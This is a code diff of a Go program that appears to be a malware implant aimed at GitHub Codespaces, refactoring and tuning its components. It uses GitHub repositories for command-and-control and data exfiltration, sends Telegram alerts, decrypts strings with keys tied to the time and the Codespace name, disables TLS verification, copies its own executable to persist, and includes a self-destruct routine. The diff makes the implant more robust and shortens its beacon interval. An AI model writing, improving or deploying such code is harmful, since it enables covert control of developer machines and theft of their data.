@@ -2,11 +2,9 @@ package main
 
 import (
 	"bytes"
-	"compress/gzip"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/hmac"
 	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
@@ -16,7 +14,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	mrand "math/rand"
 	"net"
 	"net/http"
 	neturl "net/url"
@@ -40,28 +37,20 @@ var (
 
 var (
 	HostID       = ""
-	TelemetryQ   = make(chan TelemetryEvent, 500)
-	WorkerPool   = make(chan struct{}, 100)
+	TelemetryQ   = make(chan TelemetryEvent, 1000)
 	Shutdown     = make(chan struct{})
 	DDRSeed      int64
 	AI           *FusionSentinel
 	GitHubC2Repo string
 	GitHubExfil  string
 	HttpClient   *http.Client
+	clientOnce   sync.Once
 )
 
 const (
-	BATCH_SIZE          = 64
-	BATCH_TIMEOUT       = 60 * time.Second
-	DNS_CHUNK_SIZE      = 48
-	ONNX_MODEL_PATH     = "/tmp/.phi3.bin"
-	C2_JITTER           = 30
-	C2_JITTER_MAX       = 120
-	PERSIST_FILE        = ".gh-sync"
-	MAX_RETRIES         = 3
-	RETRY_DELAY         = 3 * time.Second
-	VERIFY_TIMEOUT      = 12 * time.Second
-	DNS_RESOLVE_TIMEOUT = 5 * time.Second
+	MAX_RETRIES  = 3
+	RETRY_DELAY  = 3 * time.Second
+	PERSIST_FILE = ".gh-sync"
 )
 
 type TelemetryEvent struct {
@@ -74,15 +63,19 @@ type TelemetryEvent struct {
 }
 
 func initHttpClient() {
-	t := http.DefaultTransport.(*http.Transport).Clone()
-	t.MaxIdleConns = 100
-	t.MaxIdleConnsPerHost = 50
-	t.IdleConnTimeout = 30 * time.Second
-	t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	HttpClient = &http.Client{
-		Transport: t,
-		Timeout:   15 * time.Second,
-	}
+	clientOnce.Do(func() {
+		t := &http.Transport{
+			MaxIdleConns:        100,
+			MaxIdleConnsPerHost: 50,
+			IdleConnTimeout:     30 * time.Second,
+			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+			ForceAttemptHTTP2:   true,
+		}
+		HttpClient = &http.Client{
+			Transport: t,
+			Timeout:   15 * time.Second,
+		}
+	})
 }
 
 func safeString(v interface{}) string {
@@ -125,7 +118,8 @@ func decrypt(s string) string {
 	iv, cipherText := raw[:12], raw[12:]
 	now := time.Now().Unix() / 1800
 	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
-	for offset := int64(-1); offset <= 1; offset++ {
+
+	for offset := int64(-2); offset <= 2; offset++ {
 		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
 		key := sha256.Sum256([]byte(material))
 		block, err := aes.NewCipher(key[:])
@@ -144,10 +138,8 @@ func decrypt(s string) string {
 	return s
 }
 
-func isSandbox() bool { return false }
-func isDebugged() bool { return false }
-
 func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
+	initHttpClient()
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
 
@@ -171,6 +163,10 @@ func makeHTTP(targetURL string, method string, body []byte, headers map[string]s
 	}
 	defer resp.Body.Close()
 
+	if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == http.StatusForbidden {
+		return nil, fmt.Errorf("rate limited or forbidden: status %d", resp.StatusCode)
+	}
+
 	return io.ReadAll(resp.Body)
 }
 
@@ -181,17 +177,15 @@ func NewFusionSentinel() *FusionSentinel {
 }
 
 func getActiveRepo(action string) string {
-	if action == "c2" && GitHubC2Repo != "" {
-		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubC2Repo); err == nil {
-			return string(decoded)
-		}
-		return GitHubC2Repo
+	val := GitHubC2Repo
+	if action == "exfil" {
+		val = GitHubExfil
 	}
-	if action == "exfil" && GitHubExfil != "" {
-		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubExfil); err == nil {
+	if val != "" {
+		if decoded, err := base64.RawURLEncoding.DecodeString(val); err == nil {
 			return string(decoded)
 		}
-		return GitHubExfil
+		return val
 	}
 	return ""
 }
@@ -238,7 +232,7 @@ func telegramAlert(message string) {
 		chatID = rawChat
 	}
 
-	if token == "" ||chatID == "" {
+	if token == "" || chatID == "" {
 		return
 	}
 
@@ -260,7 +254,10 @@ func telegramAlert(message string) {
 }
 
 func persist() {
-	executable := os.Args[0]
+	executable, err := os.Executable()
+	if err != nil {
+		return
+	}
 	data, err := os.ReadFile(executable)
 	if err != nil {
 		return
@@ -274,7 +271,6 @@ func selfDestruct() {
 }
 
 func init() {
-	mrand.Seed(time.Now().UnixNano())
 	initHttpClient()
 	HostID = md5Hash(platformID())[:6]
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
@@ -305,6 +301,6 @@ func main() {
 			}
 		}
 
-		time.Sleep(60 * time.Second)
+		time.Sleep(45 * time.Second)
 	}
 }
